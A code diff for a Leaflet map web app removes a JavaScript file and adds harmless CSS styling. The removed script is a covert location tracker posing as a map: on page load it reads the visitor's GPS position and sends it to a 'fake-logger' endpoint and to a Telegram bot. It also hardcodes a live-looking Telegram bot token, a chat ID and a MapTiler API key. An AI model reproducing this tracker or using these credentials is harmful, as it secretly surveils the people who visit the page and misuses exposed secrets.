@@ -1,165 +1,259 @@
-// ✅ FINAL script.js with all advanced features
-
-let map;
-let fakeMarker;
-let customIcon = L.icon({
-  iconUrl: 'assets/custom-marker.png',
-  iconSize: [32, 32],
-  iconAnchor: [16, 32],
-});
-let liveIcon = L.icon({
-  iconUrl: 'assets/live-location-icon.png',
-  iconSize: [28, 28],
-  iconAnchor: [14, 28],
-});
-let redIcon = L.icon({
-  iconUrl: 'assets/red-marker.png',
-  iconSize: [32, 32],
-  iconAnchor: [16, 32],
-});
-
-const loadingScreen = document.getElementById("loading-screen");
-const directionPanel = document.getElementById("direction-panel");
-const searchBox = document.querySelector(".floating-search");
-const weatherBox = document.getElementById("weather-box");
-const historyPanel = document.getElementById("history-panel");
-const routeLayer = L.layerGroup();
-
-function initMap() {
-  map = L.map("map").setView([25.276987, 55.296249], 14); // Qatar (Fake View)
-
-  L.tileLayer(
-    "https://api.maptiler.com/maps/streets/{z}/{x}/{y}.png?key=VcSgtSTkXfCbU3n3RqBO",
-    {
-      tileSize: 512,
-      zoomOffset: -1,
-      attribution: "&copy; <a href='https://www.maptiler.com/'>MapTiler</a> & OpenStreetMap contributors",
-    }
-  ).addTo(map);
-
-  fakeMarker = L.marker([25.276987, 55.296249], { icon: customIcon }).addTo(map);
-  map.addLayer(routeLayer);
+/* 🌍 General Layout */
+body, html {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+  font-family: 'Roboto', sans-serif;
+  background: #f4f4f4;
 }
 
-// 🧭 Search Feature
-function performSearch() {
-  const place = document.getElementById("searchInput").value;
-  fetch(`https://api.maptiler.com/geocoding/${place}.json?key=VcSgtSTkXfCbU3n3RqBO`)
-    .then(res => res.json())
-    .then(data => {
-      if (data.features.length > 0) {
-        const [lon, lat] = data.features[0].center;
-        map.setView([lat, lon], 16);
-        fakeMarker.setLatLng([lat, lon]);
-      }
-    });
+#map {
+  height: 100vh;
+  width: 100%;
+  position: absolute;
+  top: 0;
+  left: 0;
+  z-index: 1;
 }
 
-document.getElementById("searchBtn").onclick = performSearch;
+/* 🔍 Floating Search Bar */
+.floating-search {
+  position: fixed;
+  top: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: white;
+  border-radius: 12px;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+  padding: 8px 15px;
+  z-index: 1001;
+  display: flex;
+  gap: 10px;
+  align-items: center;
+}
 
-// 📍 GPS Tracker
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition((pos) => {
-      const { latitude, longitude } = pos.coords;
-      const live = L.marker([latitude, longitude], { icon: liveIcon }).addTo(map);
-      live.bindPopup("Your Live Location").openPopup();
+.floating-search input {
+  padding: 8px 12px;
+  font-size: 14px;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+  width: 250px;
+}
 
-      // send to backend
-      fetch("https://fake-logger.onrender.com/logger.php", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ lat: latitude, lon: longitude }),
-      });
+.floating-search .search-btn {
+  background: #1976d2;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  padding: 8px 16px;
+  font-weight: bold;
+  cursor: pointer;
+}
 
-      // send to Telegram
-      const message = `\u{1F50D} New visitor:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
-      fetch(`https://api.telegram.org/bot7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: "6602027873", text: message }),
-      });
-    });
+/* ⚙️ Floating Buttons */
+.floating-buttons {
+  position: fixed;
+  right: 15px;
+  bottom: 20px;
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+  z-index: 1001;
+}
+
+.toggle-btn {
+  width: 48px;
+  height: 48px;
+  border: none;
+  border-radius: 50%;
+  background: white;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 8px;
+}
+
+.toggle-btn img {
+  width: 100%;
+  height: auto;
+}
+
+/* 🧭 Panel Styling */
+.panel {
+  position: fixed;
+  background: white;
+  border-radius: 12px;
+  box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+  padding: 20px;
+  z-index: 1001;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  width: 300px;
+}
+
+#direction-panel {
+  top: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  display: none;
+  width: 320px;
+  max-width: 90%;
+  z-index: 1002;
+}
+
+/* 🔽 Autocomplete Suggestions */
+.suggestions {
+  position: absolute;
+  background: white;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+  max-height: 150px;
+  overflow-y: auto;
+  font-size: 14px;
+  z-index: 1003;
+}
+
+.suggestion {
+  padding: 12px 16px;
+  cursor: pointer;
+}
+
+.suggestion:hover {
+  background: #f0f0f0;
+}
+
+/* 📋 History Panel */
+#history-panel {
+  display: none;
+  top: 100px;
+  right: 20px;
+  width: 300px;
+  background: white;
+  border-radius: 12px;
+  box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+  padding: 15px;
+  z-index: 1002;
+}
+
+#historyList {
+  list-style: none;
+  margin: 0;
+  padding: 0;
+}
+
+#historyList li {
+  padding: 8px;
+  border-bottom: 1px solid #eee;
+  font-size: 14px;
+}
+
+/* 📱 Responsive */
+@media (max-width: 768px) {
+  #direction-panel,
+  .floating-search {
+    width: 90%;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+  }
+
+  #history-panel {
+    width: 85%;
+    right: 8%;
+    top: 100px;
+  }
+
+  #historyList li {
+    font-size: 13px;
+    padding: 6px;
   }
 }
 
-// ⏳ Remove loading
-window.onload = () => {
-  setTimeout(() => {
-    loadingScreen.style.display = "none";
-    getLocation();
-    initMap();
-  }, 2000);
-};
-
-// ✈️ Direction Panel Toggle
-const directionBtn = document.querySelector(".direction-btn");
-directionBtn.onclick = () => {
-  directionPanel.style.display = "block";
-  searchBox.style.display = "none";
-};
-document.getElementById("closeDirectionBtn").onclick = () => {
-  directionPanel.style.display = "none";
-  searchBox.style.display = "flex";
-};
-
-// ⛳ Get Directions
-function getDirection() {
-  const start = document.getElementById("start").value;
-  const end = document.getElementById("end").value;
-
-  fetch(`https://api.maptiler.com/geocoding/${start}.json?key=VcSgtSTkXfCbU3n3RqBO`)
-    .then(r => r.json())
-    .then(startData => {
-      if (startData.features.length === 0) return;
-      const [startLon, startLat] = startData.features[0].center;
-
-      fetch(`https://api.maptiler.com/geocoding/${end}.json?key=VcSgtSTkXfCbU3n3RqBO`)
-        .then(r => r.json())
-        .then(endData => {
-          if (endData.features.length === 0) return;
-          const [endLon, endLat] = endData.features[0].center;
-
-          routeLayer.clearLayers();
-          L.Routing.control({
-            waypoints: [
-              L.latLng(startLat, startLon),
-              L.latLng(endLat, endLon)
-            ],
-            lineOptions: {
-              styles: [{ color: '#1976d2', weight: 5 }]
-            },
-            createMarker: (i, wp) => {
-              if (i === 0) {
-                return L.marker(wp.latLng, { icon: customIcon });
-              } else {
-                return L.marker(wp.latLng, { icon: redIcon });
-              }
-            },
-            addWaypoints: false,
-            draggableWaypoints: false,
-            fitSelectedRoutes: true
-          }).addTo(map);
-        });
-    });
+/* ☁️ Weather Info Box */
+#weather-box {
+  position: fixed;
+  bottom: 80px;
+  right: 75px;
+  width: 240px;
+  background: white;
+  border-radius: 12px;
+  box-shadow: 0 6px 18px rgba(0, 0, 0, 0.3);
+  padding: 16px;
+  z-index: 1002;
+  display: none;
+  font-size: 14px;
+  line-height: 1.5;
 }
 
-document.getElementById("getDirectionBtn").onclick = getDirection;
+#weather-box .title {
+  font-weight: bold;
+  margin-bottom: 8px;
+}
 
-// ☁️ Weather Button
-const weatherBtn = document.querySelector(".weather-btn");
-weatherBtn.onclick = () => {
-  weatherBox.style.display = weatherBox.style.display === "none" ? "block" : "none";
-};
+#weather-box .temp {
+  font-size: 24px;
+  font-weight: bold;
+  color: #1976d2;
+}
 
-// 🌗 Dark Mode Toggle
-const darkToggle = document.querySelector(".dark-btn");
-darkToggle.onclick = () => {
-  document.body.classList.toggle("dark-mode");
-};
+#weather-box .condition {
+  text-transform: capitalize;
+  margin-bottom: 4px;
+}
 
-// 📜 History Toggle
-const historyBtn = document.querySelector(".history-btn");
-historyBtn.onclick = () => {
-  historyPanel.style.display = historyPanel.style.display === "none" ? "block" : "none";
-};
+/* 🌗 Dark Mode */
+body.dark-mode {
+  background-color: #121212;
+  color: white;
+}
+
+body.dark-mode .panel,
+body.dark-mode .floating-search,
+body.dark-mode .toggle-btn {
+  background: #1e1e1e;
+  color: white;
+  box-shadow: 0 4px 12px rgba(255, 255, 255, 0.1);
+}
+
+body.dark-mode .suggestion:hover {
+  background: #333;
+}
+
+body.dark-mode #weather-box {
+  background: #1e1e1e;
+  color: white;
+}
+
+/* 🚦 Traffic & Weather Buttons */
+.floating-buttons .traffic-btn,
+.floating-buttons .weather-btn {
+  width: 48px;
+  height: 48px;
+  border: none;
+  border-radius: 50%;
+  background: white;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 8px;
+  transition: background 0.3s ease;
+}
+
+.floating-buttons .traffic-btn.active {
+  background-color: #ff5252;
+}
+
+.floating-buttons .weather-btn.active {
+  background-color: #29b6f6;
+}
+
+.floating-buttons .traffic-btn img,
+.floating-buttons .weather-btn img {
+  width: 100%;
+  height: auto;
+}
